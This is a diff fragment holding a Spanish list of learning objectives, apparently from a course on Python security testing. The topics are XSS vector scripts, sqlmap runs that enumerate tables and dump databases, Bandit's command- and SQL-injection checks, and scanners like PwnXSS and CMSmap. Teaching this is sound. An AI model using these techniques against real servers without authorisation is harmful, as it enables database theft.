+					- Desarrollar scripts que lean de un fichero XSS-attack-vectors.txt que contiene posibles vectores de ataque XSS.
+					
+					- Instalar y utilizar la herramienta SQLmap para detectar vulnerabilidades de tipo SQL Injection. 
+					
+					- Utilizar sqlmap para obtener toda la información sobre una base de datos que está detrás de una vulnerabilidad de inyección SQL.
+					
+					- Utilizar SQLmap poder atacar el servidor para descubrir nombres de tablas con la opción --tables y descargar una base de datos con la opción -dump.
+					
+					- Utilizar Bandit como herramienta diseñada para encontrar problemas de seguridad comunes en el código Python.
+					
+					- Utilizar Bandit para análisis de vulnerabilidades del tipo inyección de comandos con el módulo subprocess.
+					
+					- Utilizar los plugins de bandit para análisis de código estático, el plugin B602: subprocess_popen_with_shell_equals_true tiene como objetivo buscar llamadas al método subprocess.Popen().
+					
+					- Utilizar el plugin B608: Test for SQL Injection que tiene como objetivo buscar dentro del código cadenas que se parezcan a las sentencias de SQL que estén involucradas en alguna en un ataque de inyección de SQL.
+					
+					- Dar a conocer otras herramientas de análisis de código estático en python como pyup, Safety y LGTM.
+					
+					- Detectar vulnerabilidades en sitios web con herramientas automáticas como PwnXSS como escáner de vulnerabilidades XSS para python 3.7 y CMSmap como escáner de vulnerabilidades en sitios web que usen CMS como Wordpress, Joomla o Drupal.
+
+			
+
+
+
